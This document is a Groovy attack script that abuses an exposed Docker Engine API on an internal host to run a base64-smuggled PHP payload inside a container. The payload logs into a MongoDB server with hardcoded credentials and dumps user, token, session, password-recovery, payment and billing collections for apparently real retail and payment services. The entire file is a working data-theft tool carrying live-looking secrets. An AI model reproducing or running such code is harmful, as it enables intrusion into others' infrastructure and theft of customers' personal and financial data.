import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpCode = '''<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);

function dumpColl($m, $db, $coll, $limit) {
    echo "DUMP|$db.$coll|limit=$limit\\n";
    try {
        $q = new MongoDB\\Driver\\Query([], ['limit'=>$limit]);
        $cur = $m->executeQuery("$db.$coll", $q);
        $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
        $i = 0;
        foreach ($cur as $doc) {
            $j = json_encode($doc, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
            if (strlen($j) > 4000) $j = substr($j,0,4000) . "...[TRUNC]";
            echo "DOC|$db.$coll|$i|$j\\n";
            $i++;
        }
    } catch (Exception $e) { echo "ERR|$db.$coll|".substr($e->getMessage(),0,150)."\\n"; }
}

$m = new MongoDB\\Driver\\Manager("mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021/sears_tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000&socketTimeoutMS=30000");

// === FULL DUMPS (colecciones chicas de alto valor) ===
$full = [
 ['admin','system.users'], ['admin','tempusers'], ['admin','users'],
 ['t1pagos','users'], ['t1pagos','tokens'], ['t1pagos','short_tokens'], ['t1pagos','stores'], ['t1pagos','payment_links'], ['t1pagos','promotion_details'],
 ['users-t1pay','addresses'],
 ['sif','User'], ['repst1','users'],
 ['singlepages','users'], ['singlepages','systemconfigs'], ['singlepages','passwordrecoveries'], ['singlepages','accounts'], ['singlepages','roles'], ['singlepages','permissions'], ['singlepages','paymethods'], ['singlepages','eshoppaymethods'], ['singlepages','billingdatas'],
 ['marketing','ConfigurationDocument'], ['marketing_sanborns','ConfigurationDocument'], ['marketing_wl','ConfigurationDocument'],
 ['shein_ms','token_handler'], ['shein_ms','seller'],
 ['t1fullfilment','userst1fullfilment'], ['t1fullfilment','tokenLyde'], ['t1fullfilment_prueba','userst1fullfilment'],
 ['guias_masivas','usuarios'],
 ['credito-claroshop','credit_installment'],
 ['tracking','usuarios_webhook'], ['tracking_cs','usuarios_webhook'],
 ['config','system.sessions'],
 ['sears','peticiones'], ['sears','mensajerias_track'], ['sears','tracking'],
 ['peticiones_api','peticiones_sears'],
 ['claroshop','mensajerias_track'], ['sanborns','mensajerias_track'],
 ['sistema_trace','mensajes_ss'], ['sms-notifications','logs'],
 ['credito_claroshop_stores','subsidiaries'], ['credito_claroshop_stores','sellers'], ['credito_claroshop_stores','stores'],
];
foreach ($full as $fc) dumpColl($m, $fc[0], $fc[1], 200);

// === SAMPLES (3 docs) ===
$samples = [
 ['t1pagos','orders'],
 ['credito-claroshop','payment'], ['credito-claroshop','purchase_charge'], ['credito-claroshop','orders'],
 ['sso','SessionDocument'], ['sso_sanborns','SessionDocument'],
 ['singlepages','sessions'], ['singlepages','eshopusers'],
 ['tracking','peticiones_sears'],
 ['admin','peticionesApi'], ['admin','lotes'],
];
foreach ($samples as $sc) dumpColl($m, $sc[0], $sc[1], 3);

echo "ALLDONE\\n";
?>'''

def b64 = java.util.Base64.encoder.encodeToString(phpCode.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def shCmd = 'echo ' + b64 + ' | base64 -d > /tmp/m5.php && php /tmp/m5.php > /tmp/m5_out.txt 2>&1; wc -c /tmp/m5_out.txt; cat /tmp/m5_out.txt'
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c",shCmd]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
su.setConnectTimeout(10000)
su.setReadTimeout(300000)
println su.inputStream.text
